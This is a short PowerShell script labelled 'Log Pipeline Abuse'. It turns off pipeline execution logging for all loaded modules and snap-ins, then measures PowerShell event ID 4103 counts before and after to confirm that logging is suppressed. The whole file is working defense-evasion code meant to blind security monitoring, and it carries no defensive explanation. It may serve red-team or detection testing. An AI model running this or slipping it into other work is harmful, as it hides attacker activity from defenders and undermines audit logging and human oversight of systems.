function Disable-ModuleLogging {
    try {
        Write-Host "Applying Log Pipeline Abuse..."

        # Get all loaded modules
        $modules = Get-Module
        Write-Host "Found $($modules.Count) loaded modules"

        $disabledCount = 0
        foreach ($module in $modules) {
            try {
                # Set LogPipelineExecutionDetails to false
                $module.LogPipelineExecutionDetails = $false
                $disabledCount++
            } catch {
                # Some modules might not allow this modification
                Write-Host "Could not disable logging for module: $($module.Name)"
            }
        }

        Write-Host "Disabled logging for $disabledCount modules"

        # Also disable for PS snap-ins
        $snapins = Get-PSSnapin
        foreach ($snapin in $snapins) {
            try {
                $snapin.LogPipelineExecutionDetails = $false
            } catch {
                Write-Host "Could not disable logging for snap-in: $($snapin.Name)"
            }
        }

        Write-Host "SUCCESS: Module logging disabled"
        return $true

    } catch {
        Write-Host "ERROR: $($_.Exception.Message)"
        return $false
    }
}

# Test pipeline abuse
Write-Host "Testing Log Pipeline Abuse..."

$before_4103 = (Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4103} -ErrorAction SilentlyContinue | Measure-Object).Count
Write-Host "4103 events before: $before_4103"

$success = Disable-ModuleLogging

if ($success) {
    # Test commands
    Get-Process | Select-Object -First 5
    Get-Service | Where-Object {$_.Status -eq "Running"} | Select-Object -First 3

    Start-Sleep 3

    $after_4103 = (Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4103} -ErrorAction SilentlyContinue | Measure-Object).Count
    Write-Host "4103 events after: $after_4103"

    $diff = $after_4103 - $before_4103
    Write-Host "NEW 4103 events: $diff"
}